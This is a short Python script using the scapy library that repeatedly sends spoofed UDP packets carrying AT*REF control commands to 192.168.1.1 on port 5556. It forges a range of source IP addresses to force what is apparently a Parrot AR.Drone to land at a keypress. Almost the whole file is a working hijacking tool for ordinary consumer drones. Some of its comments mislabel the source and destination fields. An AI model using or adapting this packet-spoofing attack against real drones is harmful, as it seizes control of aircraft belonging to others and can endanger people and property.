from scapy.all import *
import socket
import sys, tty, termios

#get command from keyboard
def getChar():      
    fd = sys.stdin.fileno()   #return integer file descriptor 
    old_settings = termios.tcgetattr(fd)  #return a list cotainning attributes for file descriptor fd: [iflag, oflag, cflag, lflag, ispeed, ospeed, cc]
    try:
        tty.setraw(sys.stdin.fileno()) #Change the mode of the file descriptor fd to raw
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings) #set tty attributes for fd from old_setting, TCSADRAIN to change after transmitting all queued output
    return ch

#set bits for different drone movement
def setBits( lst ):
    """
    set the bits in lst to 1.
    also set bits 18, 20, 22, 24, and 28 to one (since they should always be set)
    all other bits will be 0
    """
    res = 0
    for b in lst + [18,20,22,24,28]:
        res |= (1 << b) #1 move left for b bits and xor with res, set b to 1
    return res

def sendCommand(cmd,source_ip):
    global seqno   #sequence number
    print "DEBUG: Sending:  '%s'" % cmd.strip()
    for i in xrange(1,25): 
    	spoofed_packet = IP(src=source_ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / cmd
    	send(spoofed_packet)
        # seqno += 1

def printUsage():
    print "\tl       - land"

def land():
    global seqno
    land_cmd = setBits([])
    for i in range(2,10):
        srcIP = "192.168.1." + "%d"%i
        print "Source IP: ", srcIP
    	sendCommand("AT*REF=%d,%d\r" % (seqno,land_cmd),srcIP)

dstIP = '192.168.1.1' # spoofed source IP address
dstPort = 5556 # source port
srcPort = 5554 # destination port
seqno = 1

while True:
    printUsage()
    ch = getChar()
    if ch == 'l':
        land()
    elif ch == 'q':
        exit(0)
    else:
        print "Invalid command!"

